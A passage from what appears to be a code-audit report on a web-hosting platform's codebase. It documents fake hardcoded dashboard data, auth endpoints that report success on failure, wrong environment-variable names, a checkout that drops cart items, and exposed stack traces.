- **`GET /supabase/logs`** (line 636): five entirely hardcoded fake log lines are returned for *every* customer's "log stream," including a fabricated line reading `Auth event: user_token_grant email=admin@shanutechx.com` — implying a specific admin login event that never happened, shown to any customer viewing what they believe are their own project's live logs.
- **`GET /supabase/integrations`** (line 649): hardcoded fake webhooks, Vault secrets (including a fake `STRIPE_SECRET_KEY` entry), and Foreign Data Wrapper connections (`stripe_fdw`, `firebase_fdw`) — none of which reflect anything actually configured in the customer's real Supabase project.
- **`GET /supabase/functions`** (line 549): returns two hardcoded fake Edge Functions (`hello-world`, `generate-ai-completion`) for every project, with no attempt to query any real functions runtime at all.

Combined with the Realtime studio and Performance Advisors findings above, this means most of the "Supabase Studio" management surface in this dashboard is a themed static demo rather than a real management interface — only a handful of endpoints in this file (schema/table browsing, auth user management, and the security-advisor RLS check) appear to genuinely query the customer's actual database.

## 🔴 `apps/api/src/routes/supabase.ts` — deleting/creating a Supabase auth user reports success even when it actually failed

Two related false-success bugs, both in the "Supabase Auth Studio" user-management endpoints:
- **`DELETE /supabase/auth/users/:id`** (line 461): calls the real GoTrue admin API, then does:
  ```js
  if (!result.ok) { return res.json({ ok: true, deletedId: id }); }
  res.json({ ok: true, deletedId: id });
  ```
  **Both branches return the identical success response.** If the real deletion fails for any reason (backend unreachable, permission error, user doesn't exist), the caller is told `ok: true` exactly as if it had succeeded — an admin trying to remove a user (e.g. a compromised or abusive account) has no way to know the deletion silently didn't happen.
- **`POST /supabase/auth/users`** (line 434): on a real-creation failure, instead of returning an error, it fabricates and returns a **201 Created** with a synthetic fake user object (`id: 'usr_' + Date.now()...`) that was never actually created in the real auth system. An admin believes they successfully created a new login for someone when nothing exists in the real backend.

Contrast with the correctly-implemented `GET /supabase/db/schemas` a few lines below, which properly returns a `503` with `isFallback: true` when its backend call fails — showing the right pattern exists elsewhere in the same file but wasn't applied to the two auth-mutation endpoints, which is exactly where silently-fake success is most dangerous.

## 🔴 Wrong environment variable name (`NEXT_PUBLIC_API_URL` vs `NEXT_PUBLIC_API_BASE_URL`) breaks five features in production, including the entire standalone Webmail login

The dashboard's canonical, documented env var for reaching the API is `NEXT_PUBLIC_API_BASE_URL` — it's the only one declared in `apps/dashboard/.env.example`, the only one referenced by the shared `apiFetch`/`useAuth`/`api.ts` client used everywhere else in the app, and the only one the real production build actually sets (`infra/control-plane/docker-compose.yml:232`, `NEXT_PUBLIC_API_BASE_URL: ${NEXT_PUBLIC_API_BASE_URL}` — there is no `NEXT_PUBLIC_API_URL` build arg anywhere in the compose file).

Five files instead reference a **different, never-set** variable name and fall back to a hardcoded localhost URL:
```js
const apiBase = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:4000';
```
- `app/webmail/login/page.tsx` — **the login page for the entire standalone public Webmail product**
- `app/webmail/page.tsx` — the standalone Webmail inbox itself (1344 lines)
- `app/(protected)/admin/email/page.tsx` — admin mail telemetry
- `app/(protected)/deployments/[id]/ide/page.tsx` — the Web IDE's deployment-loading fetch
- `components/email/DynamicDnsSetupGuide.tsx` — already flagged above for a separate, compounding auth-header bug

Since `NEXT_PUBLIC_*` variables are inlined into the JavaScript bundle at **build time**, and the real production build never sets `NEXT_PUBLIC_API_URL`, `process.env.NEXT_PUBLIC_API_URL` is `undefined` in every production build, so all five of these unconditionally fall through to `http://localhost:4000` — a URL that resolves to the *end user's own machine*, not the real API, and will always fail to connect from a real visitor's browser. Most severely, this means **the standalone Webmail login page can never actually reach the API in production** — every customer trying to log into that product surface gets a network error, permanently, until this is fixed. The Web IDE page (see the entry above) is separately also broken because it lacks an Authorization header, so it would fail even if the URL were correct.

## `apps/dashboard/app/(protected)/deployments/[id]/ide/page.tsx` — Web IDE's deployment fetch never sends an auth token

Independent of the wrong-env-var bug above, this page's `fetch` also never attaches an `Authorization` header:
```js
const res = await fetch(`${API_BASE_URL}/api/deployments/${id}`, {
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
});
```
`credentials: 'include'` sends/receives cookies — but the API has no cookie-based session auth anywhere (confirmed: no `res.cookie`/`cookie-parser`/`req.cookies` usage in `apps/api/src`); every authenticated endpoint expects a Bearer token, attached by the shared `apiFetch` helper everywhere else in the app. This hand-rolled fetch bypasses that helper entirely, so even with the correct API URL, `GET /api/deployments/:id` would 401 for every request, and the page permanently shows "Unable to load Web IDE."

## `apps/dashboard/app/webmail/page.tsx` — Contacts, Tasks, and Calendar Events are entirely local-only here too

Same "feature theater" pattern found in the newer webmail UI's `WebmailContactsTab.tsx`/`WebmailCalendarTab.tsx`, but in this separate, standalone Webmail product surface: adding a contact (`setContacts([...contacts, {...}])`), a task (`setTasks([...tasks, {...}])`), or a calendar event (`setCalendarEvents([...calendarEvents, {...}])`) is implemented purely as local React state mutation — no `fetch`/API call accompanies any of the three. Everything added is lost on page refresh and was never sent to any backend. (Unlike the other webmail's fake pre-seeded demo data, this one at least starts genuinely empty — but nothing typed in ever persists either.)

## 🔴 `apps/web` — wrong env var name breaks nearly every dynamic feature on the public marketing site in production (13 occurrences across 9 files)

The actual, documented, and only variable the real production build ever sets for this app is **`API_BASE_URL`** (no `NEXT_PUBLIC_` prefix — confirmed in both `apps/web/.env.example` and the production build args in `infra/control-plane/docker-compose.yml:205`: `API_BASE_URL: ${API_BASE_URL:-https://api.shanutechx.com}`). `NEXT_PUBLIC_API_URL` is never set anywhere for this app in production — it isn't even the same wrong name as the dashboard's parallel bug (that one at least shares a naming convention; this is a different app mixing up the dashboard's variable name with its own).

Rather than importing one shared constant, nearly every file that needs the API base URL independently re-hardcodes the identical broken line — I found **13 separate occurrences across 9 files**:
```js
const apiBase = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:4000';
```
- `lib/api.ts` — `fetchProducts()`, powering the live product/plan catalog on **five separate marketing pages** (`catalog`, `app-hosting`, `databases`, `vps`, `bot-hosting`). Wrapped in a try/catch that swallows any error and returns `[]`, so every one of these pages silently renders with **zero products or plans shown**, no visible error, and nothing logged.
- `components/Contact.tsx` — the public "Contact Us" form's submit handler; every submission fails.
- `components/Pricing.tsx` / `app/pricing/page.tsx` — pricing display.
- `components/ReviewCarousel.tsx` (3 occurrences) / `app/reviews/page.tsx` (3 occurrences) — review submission and display.
- `components/Navbar.tsx` — whatever the navbar fetches from the API.
- `components/MaintenanceBanner.tsx` — the maintenance-mode status check.
- `app/status/page.tsx` — the public status page (note: the *dashboard's* `status/page.tsx` correctly uses the shared `API_BASE` from `lib/useAuth`; this is a separate, web-app-specific copy with the bug).

Since `web` and `api` are separate Docker containers on the same network (not the same host), `http://localhost:4000` never resolves to the real API from inside the `web` container — every one of these features fails silently in the documented production deployment. This is effectively the entire dynamic surface of the public marketing site (catalog, pricing, contact form, reviews, status, maintenance banner) non-functional at once, from one repeated copy-paste bug.

## 🔴 `apps/web/context/CartContext.tsx` — checkout only ever processes the first cart item; everything else is silently dropped

```js
const proceedToCheckout = () => {
  const dashboardBase = process.env.NEXT_PUBLIC_DASHBOARD_URL || 'http://localhost:3001';
  if (items.length === 0) return;
  const firstItem = items[0];
  const targetUrl = `${dashboardBase}/orders?planId=${encodeURIComponent(firstItem.id)}&price=${firstItem.price}`;
  window.location.href = targetUrl;
};
```
The cart correctly supports multiple distinct items (`addItem`/`removeItem`/`totalCount`/`totalPrice` all operate over the full `items` array, and the cart UI presumably lists every item with a running total). But checkout hard-codes `items[0]` — only the *first* item ever added is passed through to the dashboard's order flow; every other item in the cart is completely discarded with no warning to the customer. A customer who adds a VPS plan, a database plan, and a bot-hosting plan, sees all three listed with a combined total, and clicks "Checkout" will be taken to an order flow for only the first plan they happened to add — the other two are silently lost, with the customer having no idea unless they carefully notice the order summary reflects only one item. This is a significant, easily-reproduced bug for a cart that visibly supports (and totals) multiple items.

## `apps/web/app/error.tsx` — full stack trace shown to any visitor, in any environment

The "Technical Stack Trace & Details" toggle renders `error.message || error.stack` directly to the page for any visitor who clicks it, with no `process.env.NODE_ENV === 'development'` (or similar) guard — this runs identically in production. A stack trace can reveal internal file paths, package/library versions, and implementation details of the public marketing site that are otherwise unnecessary to expose. Standard practice is to show only the `error.digest` reference ID in production (which this page already does correctly above the toggle) and reserve the full message/stack for local development.